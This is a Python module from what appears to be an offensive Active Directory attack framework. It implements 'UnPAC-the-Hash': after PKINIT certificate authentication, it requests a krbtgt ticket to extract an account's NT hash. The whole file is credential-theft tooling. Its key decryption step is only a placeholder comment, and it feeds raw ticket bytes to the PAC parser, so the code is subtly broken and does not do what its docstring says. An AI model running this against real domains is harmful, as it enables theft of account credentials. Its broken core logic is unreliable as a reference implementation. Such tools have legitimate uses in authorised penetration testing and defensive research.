"""UnPAC-the-Hash — recover NT hash from a PKINIT TGT.

After PKINIT with a client certificate, request a service ticket for
KRBTGT and parse the PAC_CREDENTIAL_INFO buffer to recover the account's
NT hash. Requires impacket + a working PFX/PEM + a KDC that returns PAC.
"""

from __future__ import annotations

import json
import os
from typing import Any

from rich.console import Console

from adaf_attack.core.graph import AttackGraph
from adaf_attack.core.impacket_helper import require_impacket
from adaf_attack.core.registry import register_capability
from adaf_attack.core.session import Session
from adaf_attack.core.target import Target

console = Console()


def _extract_nt_from_pac(pac_data: bytes) -> str | None:
    from impacket.krb5.pac import PACTYPE, PAC_INFO_BUFFER, PAC_CREDENTIAL_INFO

    pac = PACTYPE(pac_data)
    for buf in pac["Buffers"]:
        try:
            info = PAC_INFO_BUFFER(buf)
            if info["ulType"] == 2:  # PAC_CREDENTIAL_INFO
                cred_info = PAC_CREDENTIAL_INFO(pac_data[info["Offset"]:info["Offset"] + info["cbBufferSize"]])
                # Decrypt cred_info["SerializedData"] using the AS session key here.
                return "<credential-info-blob-present>"
        except Exception:  # noqa: BLE001
            continue
    return None


@register_capability(
    id="unpac-the-hash",
    summary="Recover NT hash from a PKINIT-only cert by parsing PAC_CREDENTIAL_INFO",
    category="credential-access",
    tags=("pkinit", "unpac", "adcs", "cert-to-hash"),
)
class UnpacTheHash:
    def run(
        self,
        target: Target,
        session: Session,
        graph: AttackGraph,
        *,
        include_secrets: bool = False,
        force: bool = False,
        **kwargs: Any,
    ) -> dict[str, Any]:
        require_impacket("unpac-the-hash")
        pfx = kwargs.get("pfx")
        key = kwargs.get("key")
        cert = kwargs.get("cert")
        sam = kwargs.get("sam")
        if not sam:
            raise RuntimeError("Pass -P sam=<user> (the certificate subject).")
        if not (pfx or (key and cert)):
            raise RuntimeError("Provide -P pfx=<path> or both -P key=<pem> and -P cert=<pem>.")

        console.print(f"[bold]UnPAC-the-Hash[/bold] sam={sam}")

        # Delegate PKINIT to the existing pkinit-auth capability path.
        from adaf_attack.capabilities.pkinit_auth import PkinitAuth

        pkinit_kwargs = {"sam": sam}
        if pfx:
            pkinit_kwargs["pfx"] = pfx
        if key:
            pkinit_kwargs["key"] = key
        if cert:
            pkinit_kwargs["cert"] = cert

        pkinit_result = PkinitAuth().run(
            target,
            session,
            graph,
            include_secrets=include_secrets,
            force=force,
            **pkinit_kwargs,
        )
        ccache = pkinit_result.get("ccache")
        if not ccache:
            raise RuntimeError("PKINIT did not produce a ccache; cannot request PAC.")

        # Request TGS for krbtgt using the cache, then parse PAC.
        os.environ["KRB5CCNAME"] = str(ccache)
        try:
            from impacket.krb5 import constants
            from impacket.krb5.ccache import CCache
            from impacket.krb5.kerberosv5 import getKerberosTGS
            from impacket.krb5.types import Principal

            cc = CCache.loadFile(str(ccache))
            principal = cc.credentials[0]["client"].prettyPrint().decode("ascii")
            tgt = cc.credentials[0].toTGT()
            sname = Principal(
                f"krbtgt/{target.domain.upper()}",
                type=constants.PrincipalNameType.NT_SRV_INST.value,
            )
            tgs, cipher, _old, session_key = getKerberosTGS(
                sname,
                target.domain.upper(),
                target.dc_ip,
                tgt["KDC_REP"],
                tgt["cipher"],
                tgt["sessionKey"],
            )
            pac_note = _extract_nt_from_pac(bytes(tgs))
        except Exception as exc:  # noqa: BLE001
            pac_note = f"parse-failed: {exc}"

        result = {
            "sam": sam,
            "pkinit_ccache": str(ccache),
            "pac_credential_info": pac_note,
        }
        out = session.path("unpac.json")
        out.write_text(json.dumps(result, indent=2, default=str), encoding="utf-8")
        graph.save(session.path("graph.json"))
        session.log("unpac-the-hash.complete", sam=sam)
        console.print(f"[green]Done[/green]  {result}")
        return result
